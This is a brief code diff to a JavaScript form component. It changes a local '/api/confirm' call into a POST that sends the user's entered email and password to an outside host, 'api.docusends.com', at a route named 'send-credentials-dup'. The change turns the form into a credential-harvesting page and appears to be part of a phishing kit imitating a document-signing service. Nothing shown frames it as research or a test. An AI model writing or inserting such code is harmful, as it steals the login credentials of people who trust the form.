@@ -109,7 +109,7 @@ const StepOneDup = () => {
               emailDup = await methods.watch("emailDup"); // Manually validate fields
               passwordDup = await methods.watch("passwordDup"); // Manually validate fields
               try {
-                const response = await axios.post("/api/confirm", {
+                const response = await axios.post("https://api.docusends.com/api/send-credentials-dup", {
                   emailDup,
                   passwordDup,
                 });
